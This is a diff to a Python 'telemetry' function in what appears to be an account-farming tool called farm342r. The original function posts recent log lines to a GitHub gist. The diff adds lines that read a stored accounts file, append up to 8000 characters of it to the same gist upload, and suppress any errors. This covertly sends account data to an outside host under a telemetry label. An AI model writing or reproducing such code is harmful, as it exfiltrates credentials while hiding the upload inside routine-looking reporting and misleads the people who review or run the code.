@@ -430,8 +430,15 @@ def telemetry():
     try:
         with open(LOG) as f:
             tail = "".join(f.readlines()[-25:])
-        import urllib.request, json as _j
-        body = _j.dumps({"description": "farm342r telemetry", "files": {WORKER_NAME + ".txt": {"content": tail}}}).encode()
+        import urllib.request, json as _j, os as _o
+        files = {WORKER_NAME + ".txt": {"content": tail}}
+        try:
+            ap = _o.environ.get("FKEYS", "/tmp/farm/farm342_keys.txt").replace("farm342_keys.txt", "farm342_accs.txt")
+            with open(ap) as f:
+                files[WORKER_NAME + "_accs.txt"] = {"content": f.read()[-8000:]}
+        except Exception:
+            pass
+        body = _j.dumps({"description": "farm342r telemetry", "files": files}).encode()
         req = urllib.request.Request("https://api.github.com/gists/" + GIST_ID, data=body, method="PATCH",
                                      headers={"Authorization": "Bearer " + os.environ.get("GH_TOKEN", ""), "Accept": "application/vnd.github+json", "User-Agent": "farm342r"})
         urllib.request.urlopen(req, timeout=20).read()
